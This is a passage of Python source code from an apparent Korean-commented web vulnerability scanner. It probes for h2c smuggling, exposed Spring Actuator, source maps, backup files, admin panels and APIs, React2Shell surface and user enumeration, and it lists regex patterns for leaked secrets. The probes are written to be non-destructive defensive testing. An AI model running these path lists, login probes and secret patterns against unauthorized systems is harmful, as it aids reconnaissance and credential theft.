    if parsed.scheme != "http":
        return None   # h2c 는 평문 업그레이드(https 는 ALPN h2 로 별개)
    host = parsed.hostname
    port = parsed.port or 80
    if not host:
        return None
    req = (f"GET / HTTP/1.1\r\nHost: {host}\r\n"
           "Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\n"
           "HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nUser-Agent: Eoseureum\r\n\r\n")
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=6)
        writer.write(req.encode()); await writer.drain()
        data = await asyncio.wait_for(reader.read(1024), timeout=6)
        try:
            writer.close()
        except Exception:
            pass
    except ScanInterrupted:
        raise
    except Exception:
        return None
    text = data.decode("latin-1", "ignore")
    first_line = text.split("\r\n", 1)[0].lower()
    low = text.lower()
    if "101" in first_line and "upgrade" in low and "h2c" in low:
        return {
            "type": "h2c_smuggling", "confirmed": True, "url": base_url,
            "param": "-", "method": "GET", "cwe_hint": "CWE-444",
            "evidence": ("평문 HTTP/2(h2c) 업그레이드 수락: 서버가 Upgrade: h2c 요청에 "
                         "101 Switching Protocols 로 응답 — 앞단 프록시가 h2c 를 미검사하면 "
                         "요청 스머글링/접근제어 우회(h2c smuggling)의 발판이 됨."),
            "affected_endpoints": [base_url],
        }
    return None


# ── Phase 2: Spring Actuator ─────────────────────────────────────────────────

_ACTUATOR_PATHS = [
    "/actuator",
    "/actuator/health",
    "/actuator/env",
    "/actuator/mappings",
    "/actuator/beans",
    "/actuator/metrics",
    "/actuator/configprops",
    "/actuator/loggers",
    "/actuator/httptrace",
]

_ACTUATOR_SENSITIVE_RE = re.compile(
    r'(password|secret|credential|datasource|db\.url|db_url|'
    r'spring\.datasource|api[_\-]?key|private[_\-]?key|'
    r'AWS_|STRIPE_|jwt\.secret|token\.secret)',
    re.IGNORECASE,
)


async def _probe_spring_actuator(session, base_url: str, scan_id: str = "") -> dict | None:
    """Spring Actuator 엔드포인트 무인증 노출 — 민감정보(DB URL, secret) 포함 여부 확인."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    accessible = []
    sensitive_hits = []

    for path in _ACTUATOR_PATHS:
        url = origin + path
        status, body, _ = await _get(session, url)
        if status not in (200, 201):
            continue
        if not body or len(body) < 20:
            continue
        # JSON/YAML 응답인지 확인
        is_json = body.strip().startswith(("{", "["))
        if not is_json and "actuator" not in body.lower() and "status" not in body.lower():
            continue
        accessible.append({"path": path, "status": status, "size": len(body)})
        # 민감정보 키워드 탐색
        for m in _ACTUATOR_SENSITIVE_RE.finditer(body):
            snippet_start = max(0, m.start() - 20)
            snippet = body[snippet_start: m.end() + 60].strip()
            # 마스킹된 값(******)은 실제 노출이 아님 — actuator 가 값을 가린 경우 오탐 배제
            if re.search(r':\s*"?\*{3,}', snippet) or '******' in snippet:
                continue
            sensitive_hits.append({"keyword": m.group(0), "snippet": snippet[:150]})
            if len(sensitive_hits) >= 5:
                break

    if not accessible:
        return None

    # 민감정보 있으면 CONFIRMED, 없으면 POSSIBLE
    confirmed = bool(sensitive_hits)
    hit_paths = [a["path"] for a in accessible]
    hit_str = ", ".join(hit_paths[:5])

    shot = None
    if scan_id and accessible:
        first_url = origin + accessible[0]["path"]
        shot = await _capture_devtools_network_shot(
            scan_id, "spring_actuator", first_url,
            highlight_texts=[h["keyword"] for h in sensitive_hits[:3]],
            vuln_title=f"Spring Actuator 무인증 노출 — {accessible[0]['path']}",
        )

    evidence_detail = f"접근 가능 엔드포인트: {hit_str}"
    if sensitive_hits:
        evidence_detail += f"\n민감정보 키워드: " + ", ".join({h["keyword"] for h in sensitive_hits})

    return {
        "url": origin + accessible[0]["path"],
        "accessible_paths": hit_paths,
        "sensitive_hits": sensitive_hits,
        "confirmed": confirmed,
        "evidence_screenshots": [shot] if shot else [],
        "evidence": (
            f"Spring Actuator 무인증 노출: {len(accessible)}개 엔드포인트 접근 가능 ({hit_str})"
            + (f". 민감정보 포함: {', '.join({h['keyword'] for h in sensitive_hits})}" if sensitive_hits else "")
        ),
    }


# ── Phase 2: Source Map 노출 ─────────────────────────────────────────────────

_SOURCE_MAP_RE = re.compile(
    r'(//[#@]\s*sourceMappingURL=|X-SourceMap:|SourceMap:)',
    re.IGNORECASE,
)

_SOURCE_MAP_CONFIRM_RE = re.compile(r'"sources"\s*:', re.IGNORECASE)


async def _probe_source_map(session, base_url: str) -> dict | None:
    """JS Source Map 노출: 소스코드 역컴파일 가능 여부 확인."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # 메인 페이지에서 JS 파일 목록 추출
    _, html_body, _ = await _get(session, base_url)
    js_urls = []
    if html_body:
        for m in re.finditer(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', html_body, re.IGNORECASE):
            url = _resolve_url(base_url, m.group(1))
            if parsed.netloc in url:
                js_urls.append(url)

    # 공통 Source Map 경로도 추가
    js_urls += [
        f"{origin}/static/js/main.chunk.js",
        f"{origin}/static/js/bundle.js",
        f"{origin}/assets/index.js",
    ]

    for js_url in js_urls[:8]:
        _, js_body, js_hdrs = await _get(session, js_url)
        if not js_body:
            continue

        # sourceMappingURL 주석 찾기
        map_url = None
        for m in _SOURCE_MAP_RE.finditer(js_body[-500:]):
            after = js_body[m.end():].strip().split()[0] if js_body[m.end():].strip() else ""
            if after and not after.startswith("data:"):
                map_url = _resolve_url(js_url, after)
                break

        # X-SourceMap 헤더 확인
        if not map_url:
            for hdr in ("X-SourceMap", "SourceMap"):
                v = js_hdrs.get(hdr) or js_hdrs.get(hdr.lower())
                if v:
                    map_url = _resolve_url(js_url, v)
                    break

        if not map_url:
            # .map 확장자 직접 시도
            map_url = js_url.split("?")[0] + ".map"

        map_status, map_body, _ = await _get(session, map_url)
        if map_status != 200 or not map_body:
            continue
        if not _SOURCE_MAP_CONFIRM_RE.search(map_body[:2000]):
            continue

        # 소스 파일 목록 추출
        source_files = re.findall(r'"([^"]+(?:\.ts|\.tsx|\.jsx|\.vue|\.py)[^"]*)"', map_body[:4000])[:5]

        return {
            "url": map_url,
            "js_url": js_url,
            "confirmed": True,
            "source_files": source_files,
            "evidence": (
                f"Source Map 노출: {map_url} → HTTP {map_status}, "
                f"\"sources\" 키 확인. 전체 소스코드 역컴파일 가능."
                + (f" 노출 파일: {', '.join(source_files)}" if source_files else "")
            ),
        }
    return None


# ── Phase 2: Backup File 노출 ────────────────────────────────────────────────

_BACKUP_PATHS = [
    "/index.php.bak", "/index.php.old", "/index.php~", "/index.php.backup",
    "/config.php.bak", "/config.php.old", "/config.php~",
    "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.orig",
    "/web.config.bak", "/web.config~",
    "/settings.py.bak", "/settings.py~",
    "/application.properties.bak",
    "/.env.bak", "/.env.old", "/.env~",
    "/backup.sql", "/backup.zip", "/backup.tar.gz",
    "/site.tar.gz", "/www.zip", "/htdocs.zip",
    "/database.sql", "/db.sql",
]

_BACKUP_CONTENT_RE = re.compile(
    r'(\<\?php|define\s*\(|DB_NAME|DB_PASSWORD|SECRET_KEY|'
    r'INSERT INTO|CREATE TABLE|password\s*=|api_key\s*=)',
    re.IGNORECASE,
)


async def _probe_backup_file(session, base_url: str) -> dict | None:
    """백업 파일 노출: 소스코드·DB 덤프 등 민감 파일 직접 접근 가능 여부 확인."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    for path in _BACKUP_PATHS:
        url = origin + path
        status, body, hdrs = await _get(session, url)
        if status != 200 or not body or len(body) < 30:
            continue
        ct = (hdrs.get("Content-Type") or hdrs.get("content-type") or "").lower()
        # HTML 에러 페이지 제외
        if "text/html" in ct and not _BACKUP_CONTENT_RE.search(body[:1000]):
            continue

        preview = body[:300].strip()
        has_sensitive = bool(_BACKUP_CONTENT_RE.search(body[:2000]))

        return {
            "url": url,
            "path": path,
            "status_code": status,
            "content_type": ct,
            "confirmed": has_sensitive,
            "preview": preview,
            "evidence": (
                f"백업 파일 노출: GET {url} → HTTP {status}, {len(body)}바이트"
                + (" (민감정보 포함)" if has_sensitive else " (내용 확인 필요)")
            ),
        }
    return None


# ── Phase 6: 관리자 페이지 노출 탐지 ────────────────────────────────────────────

_ADMIN_PATHS_P6 = [
    "/admin", "/admin/", "/admin/login", "/admin/dashboard", "/admin/index",
    "/administrator", "/administrator/", "/manage", "/manager",
    "/backend", "/control", "/cp", "/cms", "/panel", "/console", "/dashboard",
    "/webadmin", "/sysadmin", "/system", "/superadmin",
    "/wp-admin", "/wp-login.php", "/phpmyadmin", "/adminer.php",
]

_ADMIN_LOGIN_RE = re.compile(
    r'(?:type=["\']password["\']|name=["\'](?:pass|password|pwd)["\']|'
    r'로그인|sign\s?in|log\s?in|관리자\s?로그인|admin\s?login|'
    r'administrator|dashboard|관리콘솔)',
    re.IGNORECASE,
)

_ADMIN_PAGE_RE = re.compile(
    r'(?:admin|administrator|dashboard|sign.?in|log.?in|관리자|관리콘솔|백오피스)',
    re.IGNORECASE,
)


async def _probe_admin_panel(session, base_url: str, scan_id: str = "") -> dict | None:
    """관리자 페이지 인터넷 노출 탐지. 인증 요구 여부와 관계없이 노출 사실 자체를 기록."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    found = []

    for path in _ADMIN_PATHS_P6:
        url = origin + path
        status, body, hdrs = await _get(session, url)
        # 200/302/301/401 → 존재 확인. 403은 존재하나 보호됨 (기록)
        if status not in (200, 301, 302, 401, 403):
            continue
        ct = hdrs.get("Content-Type", "")
        if "text/html" not in ct and status == 200:
            continue

        has_login = False
        if body and status in (200, 302):
            has_login = bool(_ADMIN_LOGIN_RE.search(body[:5000]))
        elif body and status == 401:
            has_login = True  # 인증 요구 = 로그인 필요

        is_admin_content = (
            has_login
            or bool(body and _ADMIN_PAGE_RE.search(body[:3000]))
            or status in (401, 403)
        )
        if not is_admin_content:
            continue

        found.append({
            "url": url,
            "status_code": status,
            "has_login_form": has_login,
        })

        # 가장 먼저 발견된 경로로 스크린샷 캡처
        if len(found) == 1 and scan_id and status in (200, 302, 401):
            await _capture_step_shots(scan_id, [
                (url, f"【1단계】 관리자 페이지 탐색 시작\n대상: {origin}", "#1E3A5F", "left"),
                (url, f"【2단계】 관리자 경로 접근\nGET {url}", "#B45309", "left"),
                (url,
                 f"【3단계】 ★ 관리자 페이지 인터넷 노출 확인됨\n"
                 f"URL: {url}\n상태코드: {status}\n"
                 f"로그인 폼: {'있음' if has_login else '없음'}",
                 "#DC2626", "center"),
            ], "admin_panel")

    if not found:
        return None

    primary = found[0]
    evidence_parts = [f"{f['url']} (HTTP {f['status_code']}, 로그인={'있음' if f['has_login_form'] else '없음'})"
                      for f in found[:5]]
    # 401/403/로그인폼 = 정상 보호. '무인증 접근'(200 + 관리 콘텐츠 + 로그인폼 없음)일 때만 확정.
    # 그 외(보호됨)는 노출 인벤토리로만 기록(confirmed=False) — 보호된 패널을 취약으로 과대평가하지 않음.
    unauth_reachable = any(f["status_code"] == 200 and not f["has_login_form"] for f in found)
    return {
        "url": primary["url"],
        "found_pages": found,
        "confirmed": bool(unauth_reachable),
        "confidence": "CONFIRMED_RESPONSE" if unauth_reachable else "POSSIBLE",
        "evidence": (
            (f"관리자 페이지 무인증 접근 가능: " if unauth_reachable
             else f"관리자 페이지 노출(인증 요구됨 — 참고): ")
            + f"{len(found)}개 경로 — " + "; ".join(evidence_parts[:3])
        ),
    }


# ── Phase 6: 관리자 API 노출 탐지 ──────────────────────────────────────────────

# 명백히 '관리·내부' 특권 경로만 — 공개 API(/api/users, /api/config 등)는 노출≠취약이라 제외(오탐 방지).
_ADMIN_API_PATHS_P6 = [
    "/api/admin", "/api/admin/users", "/api/admin/config",
    "/api/system", "/api/system/info",
    "/api/debug", "/api/internal",
    "/api/management", "/api/private",
    "/api/v1/admin", "/api/v2/admin",
]

# 민감 '키 이름'(구조 신호). 확정에는 이것만으로 부족 — 실제 값(PII/시크릿)도 요구한다.
_ADMIN_API_SENSITIVE_RE = re.compile(
    r'(?:"?(?:user|users|admin|role|roles|config|configuration|password|token|'
    r'secret|email|phone|address|permission|privilege|account|setting)"?\s*[:\[{])',
    re.IGNORECASE,
)

# 실제 민감 '값' — 이메일/전화/시크릿/해시 등이 응답 본문에 있어야 진짜 노출로 본다.
_ADMIN_API_PII_RE = re.compile(
    r'([\w.+-]+@[\w-]+\.[\w.-]+'                                  # 이메일
    r'|\+?\d[\d\s().-]{7,}\d'                                     # 전화번호
    r'|"(?:password|secret|token|api[_-]?key|access[_-]?token)"\s*:\s*"[^"]{6,}"'   # 시크릿 값
    r'|\b[A-Fa-f0-9]{32,}\b)',                                    # 해시/키
    re.IGNORECASE,
)


async def _probe_admin_api(session, base_url: str) -> dict | None:
    """관리자/내부 API 무인증 노출 탐지. HTTP 200 + JSON 응답 + 민감 키워드 조합."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    found = []

    for path in _ADMIN_API_PATHS_P6:
        url = origin + path
        status, body, hdrs = await _get(session, url)
        if status != 200 or not body:
            continue
        ct = hdrs.get("Content-Type", "")
        is_json = "application/json" in ct or body.strip()[:1] in ("{", "[")
        if not is_json:
            continue
        # 민감 키 구조 + 실제 민감 값(PII/시크릿) 둘 다 있어야 확정(공개 목록 API 오탐 방지)
        if not _ADMIN_API_SENSITIVE_RE.search(body[:3000]):
            continue
        if not _ADMIN_API_PII_RE.search(body[:5000]):
            continue
        preview = body[:200].replace("\n", " ")
        found.append({
            "url": url,
            "status_code": status,
            "preview": preview,
        })

    if not found:
        return None

    primary = found[0]
    evidence_parts = [f["url"] for f in found[:5]]
    return {
        "url": primary["url"],
        "found_endpoints": found,
        "confirmed": True,
        "evidence": (
            f"관리자/내부 API 무인증 노출: {len(found)}개 엔드포인트 — "
            + ", ".join(evidence_parts[:3])
            + f" → 민감 데이터(사용자·설정·권한) 열람 가능"
        ),
    }


# ── Phase 6: SPA/Framework 정보 노출 탐지 ────────────────────────────────────

_FRAMEWORK_PATTERNS_P6 = [
    (re.compile(r'<script[^>]*>.*?window\.__NEXT_DATA__\s*=', re.DOTALL | re.IGNORECASE), "Next.js", "__NEXT_DATA__"),
    (re.compile(r'__NUXT__\s*=', re.IGNORECASE), "Nuxt.js", "__NUXT__"),
    (re.compile(r'window\.__REDUX_DEVTOOLS_EXTENSION__', re.IGNORECASE), "Redux DevTools", "Redux DevTools Extension"),
    (re.compile(r'window\.__INITIAL_STATE__\s*=', re.IGNORECASE), "SPA State Exposure", "__INITIAL_STATE__"),
    (re.compile(r'window\.__APP_STATE__\s*=', re.IGNORECASE), "SPA State Exposure", "__APP_STATE__"),
    (re.compile(r'webpack(?:Jsonp|ChunkName|HotUpdate|_require)', re.IGNORECASE), "Webpack", "webpack runtime"),
    (re.compile(r'//[#@]\s*sourceMappingURL=([^\s"\']+\.map)', re.IGNORECASE), "Source Map URL", "sourceMappingURL"),
    (re.compile(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']+)["\']', re.IGNORECASE), "CMS/Framework", "meta generator"),
    (re.compile(r'vue\.config\.productionTip\s*=|Vue\.prototype\.\$[a-zA-Z]', re.IGNORECASE), "Vue.js", "Vue.js runtime"),
    (re.compile(r'ng-app|ng-controller|angular\.module', re.IGNORECASE), "Angular", "Angular directive"),
]


async def _probe_framework_info(session, base_url: str) -> dict | None:
    """SPA/프레임워크 버전 정보 및 내부 상태 노출 탐지."""
    _, body, _ = await _get(session, base_url)
    if not body:
        return None

    detected = []
    for pattern, framework, marker in _FRAMEWORK_PATTERNS_P6:
        m = pattern.search(body[:10000])
        if not m:
            continue
        evidence_text = m.group(0)[:120].strip()
        detected.append({
            "framework": framework,
            "marker": marker,
            "evidence_snippet": evidence_text,
        })

    # JS 파일에서도 확인
    js_srcs = re.findall(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body, re.IGNORECASE)
    for js_url_raw in js_srcs[:5]:
        js_url = _resolve_url(base_url, js_url_raw)
        if urllib.parse.urlparse(base_url).netloc not in js_url:
            continue
        _, js_body, _ = await _get(session, js_url)
        if not js_body:
            continue
        for pattern, framework, marker in _FRAMEWORK_PATTERNS_P6:
            if any(d["framework"] == framework for d in detected):
                continue
            m = pattern.search(js_body[:8000])
            if m:
                detected.append({
                    "framework": framework,
                    "marker": marker,
                    "evidence_snippet": m.group(0)[:120].strip(),
                    "source": js_url,
                })

    if not detected:
        return None

    frameworks = list({d["framework"] for d in detected})
    has_state_exposure = any("State" in d["framework"] or "DevTools" in d["framework"] for d in detected)

    return {
        "url": base_url,
        "detected_frameworks": detected,
        "confirmed": has_state_exposure,  # 상태 노출이 있으면 CONFIRMED, 단순 탐지는 POSSIBLE
        "evidence": (
            f"프레임워크/빌드 도구 정보 노출: {', '.join(frameworks)} — "
            + "; ".join(f"{d['marker']}" for d in detected[:3])
        ),
    }


# ── CVE 상관: React2Shell (CVE-2025-55182) — RSC/Server Actions 역직렬화 RCE ──────
_RSC_FP_RE = re.compile(
    r'__NEXT_DATA__|/_next/(static|image)|react-server-dom|text/x-component|'
    r'self\.__next_f|Next\.js', re.IGNORECASE)
_RSC_FLIGHT_RE = re.compile(r'^\s*\d+:[I\[{"]', re.MULTILINE)   # Flight 프레이밍(0:I[...], 1:{...})
_BOGUS_ACTION_ID = "00000000000000000000000000000000000000ab"


async def _probe_react2shell(session, base_url: str, discovered_urls: list[str] | None = None,
                             scan_id: str = "") -> dict | None:
    """React2Shell(CVE-2025-55182) — React/Next.js Server Components 역직렬화 무인증 RCE.

    비파괴 탐지: (1) Next.js/RSC 스택 지문 확인 → (2) 무해한 'Next-Action' 요청(가젯 없는 빈 바디)으로
    Server Actions 파이프라인이 살아있는지(취약 표면 노출)만 확인한다. 실제 RCE 가젯은 절대 보내지 않는다.
    표면이 확인되면 Critical CVE 노출로 보고(패치 여부 즉시 검증 필요). 지문만 있으면 미보고(정보 노출은
    프레임워크 프로브가 담당) — 오탐 억제."""
    if os.getenv("ENABLE_CVE_INTEL", "true").strip().lower() in ("0", "false", "no", "off"):
        return None
    import cve_intel as _cve

    # 1) 스택 지문
    fp_text = ""
    try:
        _, body, hdrs = await _get(session, base_url)
        hstr = " ".join(f"{k}: {v}" for k, v in (hdrs or {}).items())
        fp_text = (hstr + " " + (body or "")[:20000])
    except ScanInterrupted:
        raise
    except Exception:
        return None
    if not _RSC_FP_RE.search(fp_text):
        return None
    cves = _cve.correlate(fp_text)
    meta = next((c for c in cves if c["cve"] == "CVE-2025-55182"), None)
    if not meta:
        return None

    # 2) Server Actions 파이프라인 활성 여부(무해 요청 — 가젯 없음)
    targets = [base_url]
    for u in (discovered_urls or []):
        if _url_in_scope(u, base_url) and u.split("?")[0] not in targets:
            targets.append(u.split("?")[0])
        if len(targets) >= 4:
            break
    surface_active = False
    hit_url = base_url
    for url in targets:
        # 무해한 'Next-Action' 요청(빈 바디, 가젯 없음)으로 Server Actions 파이프라인 신호만 관찰
        # (_post 경유 → rate 거버너·_net_record 자동 적용)
        try:
            _rs_st, atext, _rs_hdrs = await _post(
                session, url, data=b"",
                headers={"Next-Action": _BOGUS_ACTION_ID,
                         "Content-Type": "text/plain;charset=UTF-8"})
        except ScanInterrupted:
            raise
        except Exception:
            continue
        if _rs_st == 0:
            continue
        ct = (_rs_hdrs.get("Content-Type") or "").lower()
        akeys = [k.lower() for k in _rs_hdrs.keys()]
        if ("text/x-component" in ct
                or any(k.startswith("x-action") for k in akeys)
                or _RSC_FLIGHT_RE.search(atext[:3000] or "")):
            surface_active = True
            hit_url = url
            break

    if not surface_active:
        return None   # 지문만으로는 미보고(오탐 억제) — 프레임워크 정보 노출은 별도 프로브가 처리

    # 파이프라인 활성은 '취약 표면 노출'이지 '미패치'의 증거가 아니다(패치된 사이트도 응답).
    # 따라서 confirmed=False(확인 필요)로 두되, Critical 심각도·CVE는 유지해 강하게 surface 한다.
    return {
        "type": "react2shell", "confirmed": False, "confidence": "MANUAL_REVIEW",
        "url": hit_url, "cve_references": ["CVE-2025-55182"],
        "affected_endpoints": [hit_url],
        "matched_stack": meta.get("matched_on", ""),
        "evidence": (
            f"React2Shell(CVE-2025-55182) 취약 표면 노출(확인 필요): 대상이 React Server Components/Next.js "
            f"스택(지문: '{meta.get('matched_on','')}')이며, 무인증 'Next-Action' 요청에 Server Actions "
            f"파이프라인이 응답함('{hit_url}'). 이 스택의 Flight 페이로드는 무인증 역직렬화되어 원격 코드 "
            f"실행(RCE)으로 이어질 수 있습니다(CVSS 10.0, 실제 공격 관측됨). 파이프라인 응답은 취약 표면 "
            f"노출을 뜻하며 미패치의 증거는 아닙니다(패치된 버전도 응답) — 비파괴 검증(RCE 가젯 미전송). "
            f"Next.js/react-server-dom-* 버전과 패치 적용 여부를 즉시 확인하십시오."),
    }


async def _probe_cve_correlation(session, base_url: str, scan_id: str = "",
                                 technologies: list | None = None) -> dict | None:
    """스택 지문 → 알려진 CVE 상관(전용 능동 프로브가 없는 항목). 능동 실증이 아니라
    '노출 가능 · 버전/패치 확인 필요'로 승격 보고한다. 프레임워크 감지가 단순 '정보 노출'로
    묻히지 않게, 해당 CVE와 조치를 함께 제시한다(오탐 방지: 지문 일치 항목만)."""
    if os.getenv("ENABLE_CVE_INTEL", "true").strip().lower() in ("0", "false", "no", "off"):
        return None
    import cve_intel as _cve
    try:
        _, body, hdrs = await _get(session, base_url)
        hstr = " ".join(f"{k}: {v}" for k, v in (hdrs or {}).items())
        # ③ 재사용: recon 단계에서 이미 산출한 구조화 기술스택(제품/버전/근거)을 상관 입력에 포함.
        # (재핑거프린팅 대신 이전 단계 fingerprint 를 활용 — 버전·제품 신호가 더 정확)
        _tech_str = ""
        for _t in (technologies or []):
            if isinstance(_t, dict):
                _tech_str += " " + str(_t.get("name", "")) + " " \
                    + " ".join(str(e) for e in (_t.get("evidence") or []))
            else:
                _tech_str += " " + str(_t)
        fp = _tech_str + " " + hstr + " " + (body or "")[:20000]
    except ScanInterrupted:
        raise
    except Exception:
        return None
    # 전용 프로브가 담당하는 CVE(react2shell 등)는 상관에서 제외(중복 방지)
    matches = [c for c in _cve.correlate(fp) if not c.get("dedicated_probe")]
    if not matches:
        return None
    _rank = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
    matches.sort(key=lambda c: _rank.get(c.get("severity"), 9))
    top = matches[0]
    cve_list = ", ".join(f"{c['cve']}({c.get('alias','')})" for c in matches)
    return {
        "type": "cve_exposure", "confirmed": False, "confidence": "MANUAL_REVIEW",
        "url": base_url, "severity": (top.get("severity") or "Medium").upper(),
        "cve_references": [c["cve"] for c in matches],
        "matched_cves": matches,
        "evidence": (
            f"알려진 CVE 노출 가능(확인 필요): 대상 스택 지문('{top.get('matched_on','')}')이 "
            f"{cve_list} 영향 범위와 일치합니다. 지문 상관에 따른 '점검 필요' 항목으로 능동 실증은 "
            f"아닙니다 — 해당 컴포넌트의 버전·패치 적용 여부를 즉시 확인하십시오. {top.get('surface_hint','')}"),
        "recommendation": top.get("recommendation", ""),
    }


# ── Phase 6: User Enumeration 탐지 ──────────────────────────────────────────

_NONEXISTENT_USERS = ["nonexistent_user_xq9z7", "xq9z7_probe_user", "probe_notfound_99"]
_COMMON_USERS = ["admin", "test", "user"]

_LOGIN_FORM_RE = re.compile(
    r'<form[^>]*(?:action=["\']([^"\']*)["\'])?[^>]*>.*?'
    r'(?:type=["\'](?:text|email)["\'].*?|name=["\'](?:user(?:name)?|email|id|login)["\'].*?)'
    r'.*?type=["\']password["\']',
    re.DOTALL | re.IGNORECASE,
)

_USERNAME_FIELD_RE = re.compile(
    r'name=["\'](?P<name>user(?:name)?|email|id|login|uid)["\']',
    re.IGNORECASE,
)
_PASSWORD_FIELD_RE = re.compile(
    r'name=["\'](?P<name>pass(?:word)?|pwd)["\']',
    re.IGNORECASE,
)

# 계정 없음을 암시하는 응답 패턴
_USER_NOT_FOUND_RE = re.compile(
    r'(?:존재하지\s*않|없는\s*(?:계정|아이디|이메일)|'
    r'user\s*(?:not\s*found|does\s*not\s*exist)|'
    r'account\s*(?:not\s*found|does\s*not\s*exist)|'
    r'no\s*(?:such\s*)?(?:user|account)|'
    r'이메일\s*주소가\s*올바르지|아이디를\s*다시|가입되지\s*않은)',
    re.IGNORECASE,
)

# 비밀번호 오류를 암시하는 응답 패턴
_WRONG_PASSWORD_RE = re.compile(
    r'(?:비밀번호가?\s*(?:올바르지|틀|맞지|다릅니다)|'
    r'password\s*(?:incorrect|wrong|invalid|mismatch)|'
    r'잘못된\s*비밀번호|incorrect\s*password)',
    re.IGNORECASE,
)


async def _probe_user_enumeration(session, base_url: str) -> dict | None:
    """
    User Enumeration 탐지.
    로그인 폼에 존재하지 않는 계정 요청을 최대 2회 POST하여 응답 차이 분석.
    계정 잠금/Brute Force 없음: 각 계정에 1회 요청만 수행.
    """
    _, body, _ = await _get(session, base_url)
    if not body:
        return None

    # 로그인 폼 탐지
    form_match = _LOGIN_FORM_RE.search(body[:8000])
    if not form_match:
        return None

    # 폼 액션 URL 추출
    action = form_match.group(1) or ""
    login_url = _resolve_url(base_url, action) if action else base_url
    parsed_base = urllib.parse.urlparse(base_url)
    if urllib.parse.urlparse(login_url).netloc != parsed_base.netloc:
        login_url = base_url

    # 유저네임/패스워드 필드명 추출
    user_field_m = _USERNAME_FIELD_RE.search(body[:8000])
    pass_field_m = _PASSWORD_FIELD_RE.search(body[:8000])
    if not user_field_m or not pass_field_m:
        return None

    user_field = user_field_m.group("name")
    pass_field = pass_field_m.group("name")

    # 존재하지 않는 계정 → 1회 POST
    nonexist_data = {user_field: _NONEXISTENT_USERS[0], pass_field: "SomePass123!"}
    s1, body1, hdrs1 = await _post(session, login_url, data=nonexist_data,
                                   headers={**_SCANNER_HEADERS, "Content-Type": "application/x-www-form-urlencoded"})
    body1 = body1 or ""

    # 흔한 계정 이름 → 1회 POST (비밀번호는 랜덤)
    common_data = {user_field: _COMMON_USERS[0], pass_field: "WrongPass456!"}
    s2, body2, hdrs2 = await _post(session, login_url, data=common_data,
                                   headers={**_SCANNER_HEADERS, "Content-Type": "application/x-www-form-urlencoded"})
    body2 = body2 or ""

    if not body1 and not body2:
        return None

    # 비교 1: 응답 상태코드 차이
    if s1 != s2 and {s1, s2} <= {200, 400, 401, 403, 422}:
        return {
            "url": login_url,
            "user_field": user_field,
            "difference": "status_code",
            "nonexist_status": s1,
            "wrong_pass_status": s2,
            "confirmed": True,
            "evidence": (
                f"User Enumeration: 로그인 폼 {login_url} — "
                f"존재하지 않는 계정 HTTP {s1} vs 잘못된 비밀번호 HTTP {s2} (상태코드 차이)"
            ),
        }

    # 비교 2: 명시적 문구 차이
    body1_has_notfound = bool(_USER_NOT_FOUND_RE.search(body1[:3000]))
    body2_has_wrongpass = bool(_WRONG_PASSWORD_RE.search(body2[:3000]))
    if body1_has_notfound or body2_has_wrongpass:
        detail_parts = []
        if body1_has_notfound:
            detail_parts.append("존재하지 않는 계정: '계정 없음' 메시지")
        if body2_has_wrongpass:
            detail_parts.append("잘못된 비밀번호: '비밀번호 오류' 메시지")
        return {
            "url": login_url,
            "user_field": user_field,
            "difference": "error_message",
            "confirmed": True,
            "evidence": (
                f"User Enumeration: 로그인 폼 {login_url} — 오류 메시지 차이로 계정 존재 여부 판별 가능. "
                + " / ".join(detail_parts)
            ),
        }

    # 비교 3(제거됨): 응답 길이 차이 기반 판정은 오탐원이므로 사용하지 않는다.
    # 제출한 username 길이 차이(존재하지 않는 계정명 vs 흔한 계정명)·CSRF 토큰·
    # 타임스탬프 등 동적 콘텐츠만으로도 응답 길이가 달라져 실제 계정 열거와 무관하게 차이가 발생한다.
    # 프로젝트 원칙(오탐보다 미탐 허용)에 따라 상태코드/명시적 메시지 차이(비교 1·2)로만 판정한다.
    return None


# ── Phase 2: JS Secrets 개선 ─────────────────────────────────────────────────

_JS_SECRET_PATTERNS = [
    # ── AWS ────────────────────────────────────────────────────────────────────
    (re.compile(r'(?:AKIA|ASIA|AROA|AIDA|AIPA|AKIA)[A-Z0-9]{16}'), "AWS Access Key ID"),
    (re.compile(r'(?:aws[_\-]?secret|AWS_SECRET)[_\-]?(?:access[_\-]?)?key\s*[=:]\s*["\']([^"\']{20,})["\']', re.IGNORECASE), "AWS Secret Key"),
    (re.compile(r'aws[_\-]?session[_\-]?token\s*[=:]\s*["\']([^"\']{50,})["\']', re.IGNORECASE), "AWS Session Token"),
    (re.compile(r'aws[_\-]?(?:account[_\-]?)?id\s*[=:]\s*["\'](\d{12})["\']', re.IGNORECASE), "AWS Account ID"),
    # ── Azure ──────────────────────────────────────────────────────────────────
    (re.compile(r'(?:AZURE_CLIENT_SECRET|azure[_\-]?client[_\-]?secret)\s*[=:]\s*["\']([^"\']{30,})["\']', re.IGNORECASE), "Azure Client Secret"),
    (re.compile(r'(?:AZURE_SUBSCRIPTION_ID|azure[_\-]?subscription)[_\-]?id\s*[=:]\s*["\']([0-9a-f\-]{36})["\']', re.IGNORECASE), "Azure Subscription ID"),
    (re.compile(r'DefaultEndpointsProtocol=https?;AccountName=[^;]+;AccountKey=([^;"\' ]{40,})', re.IGNORECASE), "Azure Storage Connection String"),
    # ── Google / GCP ───────────────────────────────────────────────────────────
    (re.compile(r'AIza[0-9A-Za-z\-_]{35}'), "Google API Key"),
    (re.compile(r'(?:google[_\-]?api[_\-]?key|GOOGLE_API_KEY)\s*[=:]\s*["\']([^"\']{30,})["\']', re.IGNORECASE), "Google API Key (var)"),
    (re.compile(r'"type"\s*:\s*"service_account".*?"private_key_id"', re.DOTALL), "GCP Service Account JSON"),
